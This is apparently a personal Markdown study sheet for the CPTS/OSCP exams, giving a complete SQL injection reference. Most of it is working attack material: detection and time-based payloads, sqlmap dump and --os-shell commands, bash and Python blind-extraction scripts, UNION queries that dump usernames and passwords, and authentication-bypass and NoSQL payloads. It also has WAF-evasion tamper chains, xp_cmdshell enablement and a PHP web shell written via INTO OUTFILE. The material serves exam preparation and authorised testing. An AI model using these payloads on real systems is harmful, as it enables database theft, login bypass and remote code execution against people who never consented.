# SQL Injection Complete

> Comprehensive SQL injection reference for CPTS/OSCP exams. Covers detection, exploitation, and WAF evasion.

---

## 1. Detection Techniques

### Manual Detection (Entry Point Testing)

```sql
-- Basic True/False tests
'                -- Single quote (error?)
"                -- Double quote
' OR 1=1 -- -     -- Basic boolean true
' OR 1=2 -- -     -- Basic boolean false
) OR 1=1 -- -    -- With closing paren
' UNION SELECT 1 -- -  -- Union detection
```

### Error-Based Detection

```bash
# Cause database error to reveal info
curl -s "http://target.com/page.php?id=1'"
curl -s "http://target.com/page.php?id=1\""
curl -s "http://target.com/page.php?id=1\]"
curl -s "http://target.com/page.php?id=1\`"
curl -s "http://target.com/page.php?id=convert(int,(select @@version))"

# Look for:
# - SQL syntax errors
# - Database driver errors
# - Stack traces
# - Column mismatch errors
```

### Boolean-Based Detection

```bash
# Compare responses between true and false conditions
curl -s "http://target.com/page.php?id=1' AND 1=1 -- -"   # Should match normal response
curl -s "http://target.com/page.php?id=1' AND 1=2 -- -"   # Should differ

# If both return same -> not vulnerable or filtered
# If different -> boolean-based SQLi confirmed

# String-based checks
curl -s "http://target.com/page.php?user=admin' AND '1'='1"
curl -s "http://target.com/page.php?user=admin' AND '1'='2"
```

### Time-Based Detection

```bash
# MySQL
curl -s "http://target.com/page.php?id=1' AND SLEEP(5) -- -"

# PostgreSQL
curl -s "http://target.com/page.php?id=1' AND PG_SLEEP(5) -- -"

# MSSQL
curl -s "http://target.com/page.php?id=1' WAITFOR DELAY '0:0:5' -- -"

# Oracle
curl -s "http://target.com/page.php?id=1' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5) -- -"

# SQLite (limited - benchmark with heavy queries)
curl -s "http://target.com/page.php?id=1' AND LIKE('abcdefghij','%') -- -"

# Measure response time with time command
time curl -s "http://target.com/page.php?id=1' AND SLEEP(5) -- -" > /dev/null
```

---

## 2. SQLMap Mastery

### Basic Usage

```bash
# Simple GET injection
sqlmap -u "http://target.com/page.php?id=1"

# Automatic db enumeration
sqlmap -u "http://target.com/page.php?id=1" --dump

# Batch mode (non-interactive)
sqlmap -u "http://target.com/page.php?id=1" --batch
```

### POST Injection

```bash
# POST data
sqlmap -u "http://target.com/login.php" --data="user=admin&pass=test"

# JSON POST
sqlmap -u "http://target.com/api/login" --data='{"user":"admin","pass":"test"}' --headers="Content-Type: application/json"

# From request file (captured from Burp)
sqlmap -r request.txt
```

### Cookie-Based Injection

```bash
# Test cookies
sqlmap -u "http://target.com/dashboard" --cookie="session=abc123" --level=2

# Cookie injection
sqlmap -u "http://target.com/dashboard" --cookie="id=1*" --level=3 --risk=2
# The * indicates injection point within cookie
```

### Header-Based Injection

```bash
# User-Agent injection
sqlmap -u "http://target.com/page.php" --headers="User-Agent: *" --level=3

# Referer injection
sqlmap -u "http://target.com/page.php" --headers="Referer: *" --level=3

# X-Forwarded-For injection
sqlmap -u "http://target.com/page.php" --headers="X-Forwarded-For: *" --level=3
```

### From Request File (Burp Integration)

```bash
# 1. Capture request in Burp
# 2. Right-click -> Copy to file
# 3. Run sqlmap on the file
sqlmap -r captured_request.txt

# Specify injection point in file with *
sqlmap -r captured_request.txt --level=3
```

### Database Enumeration

```bash
# Enumerate databases
sqlmap -u "http://target.com/page.php?id=1" --dbs

# Enumerate tables in specific database
sqlmap -u "http://target.com/page.php?id=1" -D database_name --tables

# Enumerate columns in specific table
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users --columns

# Dump specific columns
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users -C username,password --dump

# Dump all databases
sqlmap -u "http://target.com/page.php?id=1" --dump-all
```

### Advanced SQLMap Flags

| Flag | Purpose | Example |
|------|---------|---------|
| `--os-shell` | Get OS shell (requires DB write perms) | `sqlmap -u "..." --os-shell` |
| `--os-cmd` | Execute single command | `sqlmap -u "..." --os-cmd="whoami"` |
| `--sql-shell` | Interactive SQL prompt | `sqlmap -u "..." --sql-shell` |
| `--file-read` | Read server file | `sqlmap -u "..." --file-read="/etc/passwd"` |
| `--file-write` | Write file to server | `sqlmap -u "..." --file-write=shell.php --file-dest=/var/www/` |
| `--level` | Test intensity (1-5) | `--level=5` (tests all headers) |
| `--risk` | Risk level (1-3) | `--risk=3` (uses heavy payloads) |
| `--threads` | Thread count (1-10) | `--threads=10` |
| `--time-sec` | Timeout for time-based | `--time-sec=10` |
| `--dbms` | Force DBMS type | `--dbms=mysql` |
| `--os` | Force OS | `--os=linux` |
| `--technique` | Limit technique | `--technique=BEUSTQ` |
| `--proxy` | Use proxy (Burp) | `--proxy="http://127.0.0.1:8080"` |
| `--batch` | Non-interactive | `--batch` |
| `--flush-session` | Clear cached results | `--flush-session` |
| `--tamper` | Use tamper scripts | `--tamper=space2comment` |

### OS Shell via SQLMap

```bash
# MySQL/MariaDB
sqlmap -u "http://target.com/page.php?id=1" --os-shell

# PostgreSQL
sqlmap -u "http://target.com/page.php?id=1" --dbms=postgresql --os-shell

# MSSQL (xp_cmdshell)
sqlmap -u "http://target.com/page.php?id=1" --dbms=mssql --os-shell
```

### SQLMap Proxy for Burp Integration

```bash
# Route all SQLMap requests through Burp for inspection
sqlmap -u "http://target.com/page.php?id=1" --proxy="http://127.0.0.1:8080"

# View raw traffic in Burp -> understand what SQLMap sends
# Modify request format if needed
sqlmap -u "http://target.com/page.php?id=1" --proxy="http://127.0.0.1:8080" --force-ssl
```

---

## 3. Manual SQL Injection

### Special Character Injection Tests

```sql
'        -- Basic single quote
"        -- Basic double quote
%27      -- URL-encoded single quote
%2527    -- Double-URL-encoded (WAF bypass)
\'       -- Escaped quote test
'"'      -- SQL escape sequence
'||1||'  -- Oracle concatenation
' OR '1  -- Without trailing comment
' OR 1--  -- Basic OR
' OR 1#   -- MySQL comment (hash)
```

### Boolean-Based Blind Injection

```sql
-- MySQL boolean tests
' AND 1=1 -- -     -> TRUE response
' AND 1=2 -- -     -> FALSE response

-- Check string length
' AND LENGTH(database())=7 -- -   -> TRUE if DB name length is 7

-- Extract characters
' AND SUBSTRING(database(),1,1)='m' -- -
' AND MID((SELECT table_name FROM information_schema.tables LIMIT 1),1,1)='a' -- -

-- ASCII extraction (for automation)
' AND ASCII(SUBSTRING(database(),1,1))>100 -- -
' AND ASCII(SUBSTRING(database(),1,1))=109 -- -
```

### Time-Based Blind Injection

```sql
-- MySQL
' AND IF(1=1, SLEEP(5), 0) -- -
' AND SLEEP(IF(ASCII(SUBSTRING(database(),1,1))=109, 5, 0)) -- -

-- PostgreSQL
' AND CASE WHEN (1=1) THEN PG_SLEEP(5) ELSE PG_SLEEP(0) END -- -

-- MSSQL
' IF (1=1) WAITFOR DELAY '0:0:5' -- -

-- Oracle
' AND CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE NULL END -- -
```

### Scripting Blind Injection (Bash Example)

```bash
#!/bin/bash
# Extract database name character by character

target="http://target.com/page.php?id=1"
length=20  # max db name length
dbname=""

echo "[*] Extracting database name length..."
for i in $(seq 1 $length); do
    for c in {a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z,0,1,2,3,4,5,6,7,8,9,_,-}; do
        response=$(curl -s -o /dev/null -w "%{http_code}" "$target' AND SUBSTRING(database(),$i,1)='$c' -- -")
        if [ "$response" = "200" ]; then
            dbname+=$c
            echo "[+] Found character $i: $c -> DB: $dbname"
            break
        fi
    done
done
echo "[+] Database name: $dbname"
```

### Python Blind Injection Script

```python
#!/usr/bin/env python3
import requests
import string

url = "http://target.com/page.php"
chars = string.ascii_lowercase + string.digits + "_"
db_name = ""

for i in range(1, 21):
    for c in chars:
        payload = f"1' AND SUBSTRING(database(),{i},1)='{c}' -- -"
        r = requests.get(url, params={"id": payload})
        if "normal content marker" in r.text:
            db_name += c
            print(f"[+] Position {i}: {c} -> {db_name}")
            break
    else:
        print(f"[*] End at position {i-1}")
        break

print(f"Database: {db_name}")
```

---

## 4. UNION Injection

### Column Count Detection

```sql
-- ORDER BY method (easier)
' ORDER BY 1 -- -
' ORDER BY 2 -- -
' ORDER BY 3 -- -
' ORDER BY 4 -- -   -- Error = 3 columns

-- UNION SELECT method
' UNION SELECT 1 -- -
' UNION SELECT 1,2 -- -
' UNION SELECT 1,2,3 -- -
' UNION SELECT 1,2,3,4 -- -   -- Error = 3 columns

-- NULL method (works on all DB types)
' UNION SELECT NULL -- -
' UNION SELECT NULL,NULL -- -
' UNION SELECT NULL,NULL,NULL -- -
```

### Identifying Output Columns

```bash
# Replace numbers with meaningful values to see reflection
curl -s "http://target.com/page.php?id=1' UNION SELECT 1,2,3 -- -"
# Check which numbers appear in response
# Those are your injectable columns
```

### Data Extraction via UNION

```sql
-- Basic extraction
' UNION SELECT 1,2,3 -- -
' UNION SELECT 1,database(),user() -- -
' UNION SELECT 1,@@version,3 -- -

-- MySQL - list databases
' UNION SELECT 1,GROUP_CONCAT(schema_name),3 FROM information_schema.schemata -- -

-- MySQL - list tables
' UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema='database_name' -- -

-- MySQL - list columns
' UNION SELECT 1,GROUP_CONCAT(column_name),3 FROM information_schema.columns WHERE table_name='users' -- -

-- MySQL - dump data
' UNION SELECT 1,GROUP_CONCAT(username,':',password),3 FROM users -- -

-- PostgreSQL
' UNION SELECT 1,string_agg(schemaname,','),3 FROM pg_tables -- -
' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema='public' -- -
' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users' -- -
' UNION SELECT 1,username||':'||password,3 FROM users -- -
```

### File Read via UNION (MySQL)

```sql
-- Read files (requires FILE privilege)
' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3 -- -
' UNION SELECT 1,LOAD_FILE('/var/www/html/config.php'),3 -- -
' UNION SELECT 1,LOAD_FILE('C:\\Windows\\System32\\drivers\\etc\\hosts'),3 -- -
```

---

## 5. Authentication Bypass Payloads

```sql
-- Basic auth bypass
admin' -- -
admin' #
admin'--
admin'-- -
admin'/*

-- OR-based bypass
' OR 1=1 -- -
' OR '1'='1' -- -
admin' OR 1=1--
admin') OR 1=1--
admin' OR '1'='1

-- Comment-based bypasses
admin' --
admin' #
admin'%00
admin'/*

-- JSON-based bypasses (for APIs)
{"username": "admin", "password": {"$ne": ""}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": "admin", "password": {"$regex": ".*"}}

-- Universal password bypasses
" OR 1=1 --
' OR 1=1 --
' OR '' = '
1' OR '1' = '1'
' OR 1=1 LIMIT 1 --
' UNION SELECT 1,'hash',3 --
```

---

## 6. Blind Injection (Boolean vs Time-Based)

### Boolean-Based (Response Differs)

```sql
-- Technique: Check if response changes between true/false
-- Word: response differs by content
-- Best for: reliable detection, fast extraction with threading

-- Example detecting admin user
' AND (SELECT COUNT(*) FROM users WHERE username='admin')=1 -- -
' AND (SELECT LENGTH(password) FROM users WHERE username='admin')=32 -- -

-- Pros: Fast, deterministic
-- Cons: Requires visible response difference, noisy on custom 404 pages
```

### Time-Based (Response Delayed)

```sql
-- Technique: Use SLEEP() / WAITFOR DELAY to confirm
-- Word: response time differs
-- Best for: blind scenarios where no content difference visible

-- MySQL
' AND IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64, SLEEP(5), 0) -- -

-- Pros: Works even with uniform error pages
-- Cons: Slow, unreliable network can cause false negatives
```

### Automated Blind Extraction Framework

```python
#!/usr/bin/env python3
"""
Blind SQLi extraction script
Usage: python3 blind-sqli.py "http://target.com/page.php?id=1" "SELECT password FROM users LIMIT 1"
"""
import requests
import sys
import string
from urllib.parse import quote

target = sys.argv[1]
extract_query = sys.argv[2]

# Determine technique
# "true_condition" must be the confirm string
true_marker = "Welcome"  # Adjust based on target response
charset = string.ascii_letters + string.digits + "_-{}!@#$%^&*()"

# Detect columns first
for cols in range(1, 10):
    test = f"1' ORDER BY {cols} -- -"
    r = requests.get(target.replace("1", quote(test)))
    if "error" in r.text.lower() or "mysql" in r.text.lower():
        print(f"[+] Column count: {cols - 1}")
        break

# Extract
result = ""
for pos in range(1, 64):
    found = False
    for c in charset:
        payload = f"1' AND ASCII(SUBSTRING(({extract_query}),{pos},1))={ord(c)} -- -"
        r = requests.get(target.replace("1", quote(payload)))
        if true_marker in r.text:
            result += c
            print(f"[+] Position {pos}: {c} -> {result}")
            found = True
            break
    if not found:
        break

print(f"[+] Result: {result}")
```

---

## 7. NoSQL Injection (MongoDB)

### Detection

```bash
# MongoDB injection with JSON body
curl -s -X POST http://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": {"$gt": ""}}'

curl -s -X POST http://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$ne": null}, "password": {"$ne": null}}'

# URL parameter NoSQL injection
curl -s "http://target.com/api/user?username=admin&password[$gt]=

# Boolean check
curl -s "http://target.com/api/user?username=admin&password[$regex]=.*"
```

### Exploitation Payloads

```json
// MongoDB auth bypass
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": "admin", "password": {"$gt": ""}}
{"username": "admin", "password": {"$ne": null}}

// Extract data with $regex
{"username": "admin", "password": {"$regex": "^a"}}
{"username": "admin", "password": {"$regex": "^b"}}

// In URL parameter form
?user=admin&pass[$regex]=^a.*&pass[$regex]=^b.*

// $where clause injection
{"username": "admin", "password": {"$where": "1==1"}}

// Boolean check with $where
{"username": "admin", "$where": "this.password.length==32"}
```

### NoSQLMap Tool

```bash
# Install
git clone https://github.com/codingo/NoSQLMap.git
cd NoSQLMap
python3 nosqlmap.py

# Then follow interactive prompts
```

---

## 8. WAF Evasion Techniques

### Comment Injection

```sql
-- Inline comments break signatures
' /**/OR/**/1=1 -- -
' UN/**/ION SEL/**/ECT 1,2,3 -- -
' /**/AND/**/SLEEP(5)-- -

-- Nested comments (MySQL)
' /*!12345UNION*/ SELECT 1,2,3 -- -
' /*!UNION*/ /*!SELECT*/ 1,2,3 -- -
```

### Case Variation

```sql
' uNiOn sElEcT 1,2,3 -- -
' UnIoN SeLeCt 1,2,3 -- -
' AND 1=1 -- -
```

### URL Encoding

```sql
%27%20UNION%20SELECT%201,2,3%20--%20-
%55%4e%49%4f%4e%20%53%45%4c%45%43%54%201,2,3 -- -  (hex-encoded UNION SELECT)
```

### Double URL Encoding

```sql
%2527%2520UNION%2520SELECT%25201%252C2%252C3...
```

### Hex Encoding (MySQL)

```sql
' UNION SELECT 1,0x61646d696e,3 -- -
' UNION SELECT 1,0x7573657273,3 FROM information_schema.tables -- -

-- Hex encode entire query
' UNION SELECT 1,2 FROM users WHERE username=0x61646d696e -- -
```

### Space Substitution

```sql
'/**/OR/**/1=1/**/--/**/-
'%09OR%0a1=1%0d--%0a-
'%0aOR%0d1=1%0d--%0d-
'%0cOR%0b1=1%09--%09-
```

### HTTP Parameter Pollution (HPP)

```bash
# Send multiple parameters
curl -s "http://target.com/page.php?id=1&id=2&id=3"
curl -s "http://target.com/page.php?id=1&id=1' UNION SELECT 1,2,3 -- -"
```

### Tamper Scripts for SQLMap

```bash
# List available tamper scripts
sqlmap --list-tampers

# Common tamper chains
sqlmap -u "http://target.com/page.php?id=1" --tamper=space2comment
sqlmap -u "http://target.com/page.php?id=1" --tamper=between,randomcase
sqlmap -u "http://target.com/page.php?id=1" --tamper=space2plus,apostrophemask
sqlmap -u "http://target.com/page.php?id=1" --tamper=charencode,charencode
sqlmap -u "http://target.com/page.php?id=1" --tamper=charunicodeencode
sqlmap -u "http://target.com/page.php?id=1" --tamper=hex2char
sqlmap -u "http://target.com/page.php?id=1" --tamper=equaltolike

# Heavy evasion
sqlmap -u "http://target.com/page.php?id=1" --tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,commalesslimit,commalessmid,commentbeforeparentheses,equaltolike,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nolike,percentage,randomcase,randomcomments,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,uppercase,xforwardedfor
```

---

## DBMS-Specific Cheatsheets

### MySQL

```sql
-- Version
SELECT @@version;

-- Current user
SELECT user(), database();

-- Database list
SELECT schema_name FROM information_schema.schemata;

-- Table list
SELECT table_name FROM information_schema.tables WHERE table_schema='db';

-- Column list
SELECT column_name FROM information_schema.columns WHERE table_name='tablename';

-- File read
SELECT LOAD_FILE('/etc/passwd');

-- File write
SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/shell.php';

-- Command execution (advanced)
SELECT sys_exec('id');  -- requires sys_exec() function
```

### PostgreSQL

```sql
-- Version
SELECT version();

-- Current user
SELECT current_user, current_database();

-- Database list
SELECT datname FROM pg_database;

-- Table list
SELECT tablename FROM pg_tables WHERE schemaname='public';

-- Column list (with data types)
SELECT column_name, data_type FROM information_schema.columns WHERE table_name='table';

-- File read (superuser)
COPY (SELECT 'test') TO '/tmp/test.txt';

-- Command execution (requires dblink)
CREATE EXTENSION IF NOT EXISTS dblink;
SELECT * FROM dblink('host=127.0.0.1 user=postgres dbname=target','SELECT 1') AS t(i int);
```

### MSSQL

```sql
-- Version
SELECT @@version;

-- Current user
SELECT SYSTEM_USER, CURRENT_USER, USER_NAME();

-- Database list
SELECT name FROM master..sysdatabases;

-- Table list
SELECT TABLE_NAME FROM target_db.INFORMATION_SCHEMA.TABLES;

-- Column list
SELECT COLUMN_NAME FROM target_db.INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='table';

-- Command execution (xp_cmdshell)
EXEC xp_cmdshell 'whoami';

-- Enable xp_cmdshell if disabled
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

### Oracle

```sql
-- Version
SELECT banner FROM v$version;

-- Current user
SELECT user FROM dual;

-- Database list
SELECT name FROM v$database;

-- Tables (current user)
SELECT table_name FROM user_tables;

-- All tables
SELECT owner, table_name FROM all_tables;

-- Command execution (requires Java)
SELECT DBMS_JAVA_TEST_FUNC.FUNC('id') FROM dual;
```

---

## SQLMap Cheat Sheet - Most Used Commands

```bash
# Quick dump
sqlmap -u "http://target.com/page.php?id=1" --batch --dbs
sqlmap -u "http://target.com/page.php?id=1" -D db --tables
sqlmap -u "http://target.com/page.php?id=1" -D db -T users --dump

# With auth
sqlmap -u "http://target.com/admin/page.php?id=1" --cookie="PHPSESSID=abc123"

# POST with JSON
sqlmap -u "http://target.com/api" --data='{"id":1}' --headers="Content-Type: application/json"

# From Burp request
sqlmap -r request.txt

# OS shell
sqlmap -u "http://target.com/page.php?id=1" --os-shell

# WAF evasion
sqlmap -u "http://target.com/page.php?id=1" --tamper=space2comment --random-agent

# Through Burp
sqlmap -u "http://target.com/page.php?id=1" --proxy="http://127.0.0.1:8080"

# Verbose for debugging
sqlmap -u "http://target.com/page.php?id=1" -v 3
```

---

## Related Topics

- [[../3.1 Recon and Discovery/Web Recon Methodology]] - Pre-scanning checklist
- [[../../3.3 XSS/XSS Complete]] - XSS vs SQLi detection
- [[../3.6 Command Injection/Command Injection Complete]] - RCE via SQLi
- [[../3.7 File Upload Attacks/File Upload Attacks Complete]] - SQLi into file upload
